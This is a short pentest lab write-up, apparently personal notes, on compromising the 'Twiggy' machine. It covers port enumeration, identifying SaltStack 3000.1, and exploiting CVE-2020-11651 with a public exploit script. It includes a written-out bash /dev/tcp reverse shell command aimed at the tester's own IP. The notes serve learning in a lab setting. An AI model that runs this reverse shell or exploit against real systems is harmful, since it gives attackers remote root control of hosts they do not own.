202307101052
Status: #salt #saltapi #zeromq #zmtp #saltstack #rce
Tags: [[Labs]] [[pg]]

# Twiggy
IP: 192.168.167.62

## Recon

Ports open:

```
PORT     STATE SERVICE
22/tcp   open  ssh
53/tcp   open  domain
80/tcp   open  http
4505/tcp open  unknown
4506/tcp open  unknown
8000/tcp open  http-alt
```

Port 4505/4506:

- ZeroMQ ZMTP 2.0
- After looking up some information on this service, we find that this service allows for messaging over the network using ZMTP.
- We see a possible exploit that utilizes zeromq to get RCE.
- However, this exploit is named Saltstack 3000.1 RCE.
- How can we verify that Saltstack is being used?

Port 8000:

- This is an api endpoint.
- After manual enumeration and looking at the request and response, we find that this is in fact salt-api/3000-1

![[twiggy_salt.png]]

<img src="https://github.com/charlier0cks/Pentest-Notes/blob/main/Attachments/twiggy_salt.png">

## Exploitation

- First we start with our Proof-of-Concept (PoC).
- We first grab the exploit script and run it on our target to check if its vulnerable as it has a checker function.

![[twiggy_checker.png]]

<img src="https://github.com/charlier0cks/Pentest-Notes/blob/main/Attachments/twiggy_checker.png">

- We now have verification that it is vulnerable to CVE-2020-11651
- Lets try to execute an arbitrary command that pings our machine and lets intercept it.

![[twiggy_poc.png]]

<img src="https://github.com/charlier0cks/Pentest-Notes/blob/main/Attachments/twiggy_poc.png">

- After our PoC, we can try and send a command that will get us a reverse shell.

```bash
bash -i >& /dev/tcp/192.168.45.240/80 0>&1
```

![[twiggy_root.png]]

<img src="https://github.com/charlier0cks/Pentest-Notes/blob/main/Attachments/twiggy_root.png">

- Root!






---
# References
Saltstack 3000.1 - Remote Code Execution: https://www.exploit-db.com/exploits/48421